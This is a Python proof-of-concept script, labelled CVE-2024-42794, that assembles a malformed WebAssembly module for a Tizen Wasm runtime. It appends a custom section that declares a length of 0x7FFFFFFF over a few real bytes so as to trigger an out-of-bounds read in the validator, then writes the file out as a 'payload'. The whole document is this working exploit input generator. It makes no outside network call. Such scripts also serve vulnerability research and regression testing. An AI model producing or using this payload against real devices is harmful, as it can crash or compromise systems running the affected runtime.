#!/usr/bin/env python3
"""CVE-2024-42794 — Tizen Wasm Runtime. Wasm module with a section whose
declared size exceeds the buffer -> OOB in the validator."""
import struct, sys
from pathlib import Path

def _leb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F; n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n: break
    return bytes(out)

def _section(sid: int, body: bytes, decl: int = None) -> bytes:
    return bytes([sid]) + _leb(decl if decl is not None else len(body)) + body

def build() -> bytes:
    mod = bytearray(b"\x00asm" + struct.pack("<I", 1))          # magic + version
    mod += _section(1, b"\x01" + b"\x60\x00\x00")               # type: ()->()
    mod += _section(3, b"\x01\x00")                             # function
    mod += _section(7, b"\x01\x01\x01f\x00\x00")               # export "f"
    mod += _section(10, b"\x01\x02\x00\x0b")                    # code
    # custom section with an oversized declared length
    mod += _section(0, b"\x04evil\x01\x02\x03", decl=0x7FFFFFFF)
    return bytes(mod)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2024-42794.wasm")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2024-42794 wasm payload -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
